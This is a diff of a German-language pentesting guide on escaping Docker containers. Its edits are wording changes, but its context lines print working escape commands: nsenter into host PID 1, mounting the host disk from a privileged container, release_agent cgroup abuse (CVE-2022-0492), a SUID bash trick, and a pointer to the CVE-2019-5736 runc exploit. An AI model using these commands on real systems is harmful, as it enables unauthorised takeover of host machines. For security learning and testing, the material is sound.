@@ -34,7 +34,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 > [!NOTE]
-> Falls der **Docker-Socket an einem unerwarteten Ort** ist, können Sie dennoch mit ihm kommunizieren, indem Sie den **`docker`**-Befehl mit dem Parameter **`-H unix:///path/to/docker.sock`** verwenden.
+> Falls der **Docker-Socket an einem unerwarteten Ort** ist, können Sie dennoch mit ihm kommunizieren, indem Sie den **`docker`** Befehl mit dem Parameter **`-H unix:///path/to/docker.sock`** verwenden.
 
 Der Docker-Daemon könnte auch [an einem Port (standardmäßig 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lauschen oder auf Systemd-basierten Systemen kann die Kommunikation mit dem Docker-Daemon über den Systemd-Socket `fd://` erfolgen.
 
@@ -48,7 +48,7 @@ Der Docker-Daemon könnte auch [an einem Port (standardmäßig 2375, 2376)](../.
 > - rktlet: `unix:///var/run/rktlet.sock`
 > - ...
 
-## Missbrauch von Berechtigungen zur Flucht
+## Missbrauch von Berechtigungen zur Umgehung
 
 Sie sollten die Berechtigungen des Containers überprüfen. Wenn er eine der folgenden Berechtigungen hat, könnten Sie möglicherweise daraus entkommen: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
@@ -56,7 +56,7 @@ Sie können die aktuellen Container-Berechtigungen mit **den zuvor erwähnten au
 ```bash
 capsh --print
 ```
-Auf der folgenden Seite können Sie **mehr über Linux-Fähigkeiten erfahren** und wie man sie missbrauchen kann, um Privilegien zu entkommen/eskalieren:
+Auf der folgenden Seite können Sie **mehr über Linux-Fähigkeiten erfahren** und wie man sie missbraucht, um Privilegien zu entkommen/eskalieren:
 
 {{#ref}}
 ../../linux-capabilities.md
@@ -84,7 +84,7 @@ Das Flag `--privileged` senkt die Sicherheit des Containers erheblich und bietet
 
 ### Privilegiert + hostPID
 
-Mit diesen Berechtigungen können Sie einfach **in den Namensraum eines Prozesses wechseln, der als Root auf dem Host läuft**, wie init (pid:1), indem Sie einfach ausführen: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Mit diesen Berechtigungen können Sie einfach **in den Namensraum eines Prozesses wechseln, der als Root im Host läuft**, wie init (pid:1), indem Sie einfach ausführen: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
 Testen Sie es in einem Container, indem Sie ausführen:
 ```bash
@@ -92,7 +92,7 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privilegiert
 
-Nur mit dem privilegierten Flag kannst du versuchen, auf **die Festplatte des Hosts zuzugreifen** oder versuchen, **durch Missbrauch von release_agent oder anderen Ausbrüchen zu entkommen**.
+Nur mit dem privilegierten Flag kannst du versuchen, auf **die Festplatte des Hosts** zuzugreifen oder zu versuchen, **durch die Ausnutzung von release_agent oder anderen Ausbrüchen zu entkommen**.
 
 Teste die folgenden Umgehungen in einem Container, indem du ausführst:
 ```bash
@@ -100,7 +100,7 @@ docker run --rm -it --privileged ubuntu bash
 ```
 #### Mounting Disk - Poc1
 
-Gut konfigurierte Docker-Container erlauben keine Befehle wie **fdisk -l**. Bei falsch konfigurierten Docker-Befehlen, bei denen das Flag `--privileged` oder `--device=/dev/sda1` mit Großbuchstaben angegeben ist, ist es jedoch möglich, die Berechtigungen zu erhalten, um das Host-Laufwerk zu sehen.
+Gut konfigurierte Docker-Container erlauben keine Befehle wie **fdisk -l**. Bei falsch konfigurierten Docker-Befehlen, bei denen das Flag `--privileged` oder `--device=/dev/sda1` mit Großbuchstaben angegeben ist, ist es möglich, die Berechtigungen zu erhalten, um das Host-Laufwerk zu sehen.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -109,7 +109,7 @@ Um die Host-Maschine zu übernehmen, ist es trivial:
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-Und voilà! Sie können jetzt auf das Dateisystem des Hosts zugreifen, da es im Ordner `/mnt/hola` gemountet ist.
+Und voilà! Sie können jetzt auf das Dateisystem des Hosts zugreifen, da es im `/mnt/hola`-Ordner gemountet ist.
 
 #### Mounting Disk - Poc2
 
@@ -168,7 +168,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Privilegierte Eskalation durch Ausnutzung von created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Privilegierte Escalation durch Ausnutzung von created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash:Second PoC
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -310,7 +310,7 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Privilegierte Flucht durch Ausnutzung sensibler Mounts
+#### Privilegierte Eskalation durch Ausnutzung sensibler Mounts
 
 Es gibt mehrere Dateien, die möglicherweise gemountet sind und **Informationen über den zugrunde liegenden Host** geben. Einige von ihnen können sogar **etwas anzeigen, das vom Host ausgeführt werden soll, wenn etwas passiert** (was einem Angreifer ermöglichen wird, aus dem Container auszubrechen).\
 Der Missbrauch dieser Dateien kann Folgendes ermöglichen:
@@ -335,8 +335,8 @@ docker run --rm -it -v /:/host ubuntu bash
 ```
 ### Privilegieneskalation mit 2 Shells und Host-Mount
 
-Wenn Sie als **root innerhalb eines Containers** Zugriff haben, der einen Ordner vom Host gemountet hat, und Sie als **nicht privilegierter Benutzer zum Host entkommen sind** und Lesezugriff auf den gemounteten Ordner haben.\
-Sie können eine **bash suid-Datei** im **gemounteten Ordner** innerhalb des **Containers** erstellen und **von dem Host aus ausführen**, um Privilegien zu eskalieren.
+Wenn Sie als **root innerhalb eines Containers** Zugriff haben, der einen Ordner vom Host gemountet hat, und Sie als **nicht privilegierter Benutzer auf den Host entkommen sind** und Lesezugriff auf den gemounteten Ordner haben.\
+Sie können eine **bash suid-Datei** im **gemounteten Ordner** innerhalb des **Containers** erstellen und sie **vom Host ausführen**, um Privilegien zu eskalieren.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -346,10 +346,10 @@ bash -p #From non priv inside mounted folder
 ```
 ### Privilegieneskalation mit 2 Shells
 
-Wenn Sie als **root innerhalb eines Containers** Zugriff haben und als **nicht privilegierter Benutzer auf den Host entkommen sind**, können Sie beide Shells missbrauchen, um **Privesc innerhalb des Hosts** durchzuführen, wenn Sie die Fähigkeit MKNOD innerhalb des Containers haben (standardmäßig vorhanden), wie [**in diesem Beitrag erklärt**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Mit dieser Fähigkeit darf der Root-Benutzer innerhalb des Containers **Blockgerätedateien erstellen**. Gerätedateien sind spezielle Dateien, die verwendet werden, um **auf die zugrunde liegende Hardware & Kernel-Module** zuzugreifen. Zum Beispiel gibt die /dev/sda Blockgerätedatei Zugriff auf **das Rohdatenlesen auf der Festplatte des Systems**.
+Wenn Sie als **root innerhalb eines Containers** Zugriff haben und als **nicht privilegierter Benutzer zum Host entkommen sind**, können Sie beide Shells missbrauchen, um **Privesc innerhalb des Hosts** durchzuführen, wenn Sie die Fähigkeit MKNOD innerhalb des Containers haben (standardmäßig vorhanden), wie [**in diesem Beitrag erklärt**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Mit dieser Fähigkeit darf der root-Benutzer innerhalb des Containers **Blockgerätedateien erstellen**. Gerätedateien sind spezielle Dateien, die verwendet werden, um **auf zugrunde liegende Hardware & Kernelmodule zuzugreifen**. Zum Beispiel ermöglicht die Blockgerätedatei /dev/sda den Zugriff auf **die Rohdaten auf der Festplatte des Systems**.
 
-Docker schützt vor dem Missbrauch von Blockgeräten innerhalb von Containern, indem eine cgroup-Richtlinie durchgesetzt wird, die **Blockgerätelese-/schreiboperationen blockiert**. Dennoch, wenn ein Blockgerät **innerhalb des Containers erstellt wird**, wird es über das Verzeichnis **/proc/PID/root/** von außerhalb des Containers zugänglich. Dieser Zugriff erfordert, dass **der Prozessbesitzer sowohl innerhalb als auch außerhalb des Containers derselbe ist**.
+Docker schützt vor dem Missbrauch von Blockgeräten innerhalb von Containern, indem eine cgroup-Richtlinie durchgesetzt wird, die **Lese-/Schreiboperationen auf Blockgeräten blockiert**. Dennoch, wenn ein Blockgerät **innerhalb des Containers erstellt wird**, wird es über das Verzeichnis **/proc/PID/root/** von außerhalb des Containers zugänglich. Dieser Zugriff erfordert, dass **der Prozessbesitzer sowohl innerhalb als auch außerhalb des Containers derselbe ist**.
 
 **Exploitation** Beispiel aus diesem [**Writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
@@ -423,7 +423,7 @@ Sie können auch **Prozesse beenden und einen DoS verursachen**.
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Wenn ein Container mit dem Docker [Host-Netzwerk-Driver (`--network=host`)](https://docs.docker.com/network/host/) konfiguriert wurde, ist der Netzwerk-Stack dieses Containers nicht vom Docker-Host isoliert (der Container teilt sich den Netzwerk-Namespace des Hosts), und der Container erhält keine eigene IP-Adresse. Mit anderen Worten, der **Container bindet alle Dienste direkt an die IP des Hosts**. Darüber hinaus kann der Container **ALLE Netzwerkverkehr, den der Host** sendet und empfängt, auf der gemeinsamen Schnittstelle abfangen `tcpdump -i eth0`.
+Wenn ein Container mit dem Docker [Host-Netzwerk-Driver (`--network=host`)](https://docs.docker.com/network/host/) konfiguriert wurde, ist der Netzwerk-Stack dieses Containers nicht vom Docker-Host isoliert (der Container teilt sich den Netzwerk-Namespace des Hosts), und der Container erhält keine eigene IP-Adresse. Mit anderen Worten, der **Container bindet alle Dienste direkt an die IP des Hosts**. Darüber hinaus kann der Container **ALLE Netzwerkverkehr abfangen, den der Host** über die gemeinsame Schnittstelle sendet und empfängt `tcpdump -i eth0`.
 
 Zum Beispiel können Sie dies verwenden, um **Verkehr abzuhören und sogar zu fälschen** zwischen Host und Metadateninstanz.
 
@@ -462,7 +462,7 @@ Die zweite Technik, die im Beitrag [https://labs.withsecure.com/blog/abusing-the
 Falls Sie `docker exec` als root ausführen können (wahrscheinlich mit sudo), versuchen Sie, die Berechtigungen zu eskalieren, indem Sie aus einem Container unter Ausnutzung von CVE-2019-5736 entkommen (Exploit [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Diese Technik wird im Wesentlichen die _**/bin/sh**_ Binärdatei des **Hosts** **aus einem Container** **überschreiben**, sodass jeder, der docker exec ausführt, die Payload auslösen kann.
 
 Ändern Sie die Payload entsprechend und bauen Sie die main.go mit `go build main.go`. Die resultierende Binärdatei sollte im Docker-Container zur Ausführung platziert werden.\
-Bei der Ausführung, sobald `[+] Overwritten /bin/sh successfully` angezeigt wird, müssen Sie Folgendes von der Host-Maschine aus ausführen:
+Bei der Ausführung, sobald es `[+] Overwritten /bin/sh successfully` anzeigt, müssen Sie Folgendes von der Host-Maschine aus ausführen:
 
 `docker exec -it <container-name> /bin/sh`
 
